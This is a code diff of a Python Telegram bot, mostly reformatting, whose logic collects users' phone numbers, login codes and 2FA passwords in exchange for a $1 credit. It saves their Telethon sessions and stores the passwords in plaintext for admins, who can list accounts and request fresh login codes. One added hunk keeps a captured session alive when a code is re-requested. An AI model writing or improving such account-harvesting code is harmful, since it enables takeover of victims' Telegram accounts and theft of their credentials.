@@ -76,48 +76,97 @@ class WithdrawStates(StatesGroup):
 async def init_db():
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("""
-            CREATE TABLE IF NOT EXISTS users (
-                user_id INTEGER PRIMARY KEY,
-                username TEXT,
-                full_name TEXT,
-                balance REAL DEFAULT 0.0,
-                total_earned REAL DEFAULT 0.0,
-                reg_date TEXT
-            )
-        """)
+                         CREATE TABLE IF NOT EXISTS users
+                         (
+                             user_id
+                             INTEGER
+                             PRIMARY
+                             KEY,
+                             username
+                             TEXT,
+                             full_name
+                             TEXT,
+                             balance
+                             REAL
+                             DEFAULT
+                             0.0,
+                             total_earned
+                             REAL
+                             DEFAULT
+                             0.0,
+                             reg_date
+                             TEXT
+                         )
+                         """)
         await db.execute("""
-            CREATE TABLE IF NOT EXISTS submit_requests (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                phone TEXT,
-                status TEXT DEFAULT 'pending',
-                date TEXT
-            )
-        """)
+                         CREATE TABLE IF NOT EXISTS submit_requests
+                         (
+                             id
+                             INTEGER
+                             PRIMARY
+                             KEY
+                             AUTOINCREMENT,
+                             user_id
+                             INTEGER,
+                             phone
+                             TEXT,
+                             status
+                             TEXT
+                             DEFAULT
+                             'pending',
+                             date
+                             TEXT
+                         )
+                         """)
         await db.execute("""
-            CREATE TABLE IF NOT EXISTS accounts (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                phone TEXT,
-                session_name TEXT,
-                password TEXT,
-                date TEXT
-            )
-        """)
+                         CREATE TABLE IF NOT EXISTS accounts
+                         (
+                             id
+                             INTEGER
+                             PRIMARY
+                             KEY
+                             AUTOINCREMENT,
+                             user_id
+                             INTEGER,
+                             phone
+                             TEXT,
+                             session_name
+                             TEXT,
+                             password
+                             TEXT,
+                             date
+                             TEXT
+                         )
+                         """)
         await db.execute("""
-            CREATE TABLE IF NOT EXISTS withdraw_requests (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                amount REAL,
-                status TEXT DEFAULT 'pending'
-            )
-        """)
+                         CREATE TABLE IF NOT EXISTS withdraw_requests
+                         (
+                             id
+                             INTEGER
+                             PRIMARY
+                             KEY
+                             AUTOINCREMENT,
+                             user_id
+                             INTEGER,
+                             amount
+                             REAL,
+                             status
+                             TEXT
+                             DEFAULT
+                             'pending'
+                         )
+                         """)
         await db.execute("""
-            CREATE TABLE IF NOT EXISTS settings (
-                key TEXT PRIMARY KEY,
-                value TEXT
-            )
-        """)
+                         CREATE TABLE IF NOT EXISTS settings
+                         (
+                             key
+                             TEXT
+                             PRIMARY
+                             KEY,
+                             value
+                             TEXT
+                         )
+                         """)
         await db.commit()
 
     async with aiosqlite.connect(DB_PATH) as db:
@@ -131,8 +180,8 @@ async def init_db():
 async def get_user(user_id: int):
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute(
-            "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users WHERE user_id = ?",
-            (user_id,),
+                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users WHERE user_id = ?",
+                (user_id,),
         ) as cursor:
             return await cursor.fetchone()
 
@@ -160,7 +209,8 @@ async def set_setting(key: str, value: str):
 
 
 # ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
-async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str, parse_mode: str = "Markdown"):
+async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
+                                parse_mode: str = "Markdown"):
     photo_file_id = await get_setting(photo_key)
     if photo_file_id:
         try:
@@ -209,7 +259,8 @@ async def send_log(text: str):
         logger.error(f"Не удалось отправить лог: {e}")
 
 
-async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int, has_2fa: bool = False, password_used: str = None):
+async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int,
+                                    has_2fa: bool = False, password_used: str = None):
     try:
         if await client.is_user_authorized():
             await client.session.save()
@@ -254,7 +305,8 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
 
     try:
         success_text = "✅ Ваш аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
-        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS), parse_mode="Markdown")
+        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS),
+                               parse_mode="Markdown")
     except Exception:
         pass
 
@@ -263,7 +315,8 @@ async def finalize_auth_and_success(client: TelegramClient, phone: str, session_
 @router.message(Command("start"))
 async def cmd_start(message: Message):
     user = message.from_user
-    reg_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else message.date.strftime("%Y-%m-%d %H:%M:%S")
+    reg_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else message.date.strftime(
+        "%Y-%m-%d %H:%M:%S")
     await add_user(user.id, user.username or "NoUsername", user.full_name, reg_date)
 
     is_admin = user.id in ADMIN_IDS
@@ -359,7 +412,8 @@ async def process_phone(message: Message, state: FSMContext):
             await client.disconnect()
         except Exception:
             pass
-        await status_msg.edit_text(f"❌ Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS), parse_mode="Markdown")
+        await status_msg.edit_text(f"❌ Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS),
+                                   parse_mode="Markdown")
         await state.clear()
 
 
@@ -402,7 +456,8 @@ async def process_code(message: Message, state: FSMContext):
         err_text = "🔐 На вашем аккаунте установлен облачный пароль (2FA).\nВведите ваш пароль в чат:"
         if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text, reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
             except Exception:
                 pass
         await state.set_state(AuthStates.waiting_for_password)
@@ -416,7 +471,8 @@ async def process_code(message: Message, state: FSMContext):
         err_text = f"❌ Неверный код или ошибка: `{e}`\nВведите код повторно:"
         if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text, reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
             except Exception:
                 pass
 
@@ -462,7 +518,8 @@ async def process_password(message: Message, state: FSMContext):
         err_text = f"❌ Неверный пароль или ошибка: `{e}`\nВведите пароль снова:"
         if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text, reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
             except Exception:
                 pass
 
@@ -502,7 +559,8 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         err_text = "❌ Введите корректное число:"
         if prompt_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text, reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
             except Exception:
                 pass
         return
@@ -514,14 +572,16 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         err_text = f"❌ Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:"
         if prompt_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text, reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
             except Exception:
                 pass
         return
 
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, message.from_user.id))
-        cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount, status) VALUES (?, ?, 'pending')", (message.from_user.id, amount))
+        cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount, status) VALUES (?, ?, 'pending')",
+                                  (message.from_user.id, amount))
         req_id = cursor.lastrowid
         await db.commit()
 
@@ -547,11 +607,15 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
     success_text = f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
     if prompt_msg_id:
         try:
-            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown")
+            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text,
+                                        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                        parse_mode="Markdown")
         except Exception:
-            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown")
+            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                 parse_mode="Markdown")
     else:
-        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown")
+        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                             parse_mode="Markdown")
 
     await state.clear()
 
@@ -629,12 +693,15 @@ async def admin_accounts_list(callback: CallbackQuery):
         return
 
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT id, user_id, phone, password, date FROM accounts ORDER BY id DESC LIMIT 15") as cursor:
+        async with db.execute(
+                "SELECT id, user_id, phone, password, date FROM accounts ORDER BY id DESC LIMIT 15") as cursor:
             accounts = await cursor.fetchall()
 
     if not accounts:
-        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
-        return await callback.message.edit_text("📭 Завершенных сделок пока нет.", reply_markup=kb, parse_mode="Markdown")
+        kb = InlineKeyboardMarkup(
+            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
+        return await callback.message.edit_text("📭 Завершенных сделок пока нет.", reply_markup=kb,
+                                                parse_mode="Markdown")
 
     kb_buttons = []
     for acc in accounts:
@@ -661,7 +728,8 @@ async def admin_auto_request_code(callback: CallbackQuery):
     acc_id = int(callback.data.split("_")[3])
 
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT user_id, phone, session_name, password FROM accounts WHERE id = ?", (acc_id,)) as cursor:
+        async with db.execute("SELECT user_id, phone, session_name, password FROM accounts WHERE id = ?",
+                              (acc_id,)) as cursor:
             row = await cursor.fetchone()
 
     if not row:
@@ -670,12 +738,19 @@ async def admin_auto_request_code(callback: CallbackQuery):
     uid, phone, session_name, password = row
     session_file_path = f"{session_name}.session"
 
-    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунту `{phone}` и запрашиваю код у Telegram...", parse_mode="Markdown")
+    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунту `{phone}` и запрашиваю код у Telegram...",
+                                     parse_mode="Markdown")
 
     client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
     try:
         await client.connect()
-        await client.send_code_request(phone)
+
+        # Проверяем статус авторизации, чтобы предотвратить случайный сброс или лив сессии
+        if await client.is_user_authorized():
+            await client.send_code_request(phone, force_sms=False)
+        else:
+            await client.send_code_request(phone)
+
         await client.disconnect()
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -816,15 +891,18 @@ async def admin_export_txt(callback: CallbackQuery):
         return
 
     async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users") as cursor:
+        async with db.execute(
+                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users") as cursor:
             rows = await cursor.fetchall()
 
     file_path = "users_table.txt"
     with open(file_path, "w", encoding="utf-8") as f:
-        f.write(f"{'ID':<12} | {'USERNAME':<15} | {'FULL NAME':<20} | {'BALANCE':<10} | {'EARNED':<10} | {'REG DATE'}\n")
+        f.write(
+            f"{'ID':<12} | {'USERNAME':<15} | {'FULL NAME':<20} | {'BALANCE':<10} | {'EARNED':<10} | {'REG DATE'}\n")
         f.write("-" * 90 + "\n")
         for r in rows:
-            f.write(f"{r[0]:<12} | {str(r[1]):<15} | {str(r[2]):<20} | ${float(r[3]):<9.2f} | ${float(r[4]):<9.2f} | {r[5]}\n")
+            f.write(
+                f"{r[0]:<12} | {str(r[1]):<15} | {str(r[2]):<20} | ${float(r[3]):<9.2f} | ${float(r[4]):<9.2f} | {r[5]}\n")
 
     await callback.message.answer_document(
         document=FSInputFile(file_path),
@@ -854,7 +932,8 @@ async def admin_get_uid(message: Message, state: FSMContext):
         return await state.clear()
 
     await state.update_data(target_uid=uid)
-    await message.answer(f"👤 Найден пользователь: {user[2]} (@{user[1]})\nТекущий баланс: ${user[3]:.2f}\n\nВведите новый баланс (число):")
+    await message.answer(
+        f"👤 Найден пользователь: {user[2]} (@{user[1]})\nТекущий баланс: ${user[3]:.2f}\n\nВведите новый баланс (число):")
     await state.set_state(AdminStates.waiting_for_new_balance)
 
 
@@ -880,7 +959,8 @@ async def admin_set_balance(message: Message, state: FSMContext):
 async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS:
         return
-    await callback.message.answer("📢 Введите текст рассылки для всех пользователей **samoobman priemka**:", parse_mode="Markdown")
+    await callback.message.answer("📢 Введите текст рассылки для всех пользователей **samoobman priemka**:",
+                                  parse_mode="Markdown")
     await state.set_state(AdminStates.waiting_for_broadcast_text)
 
 
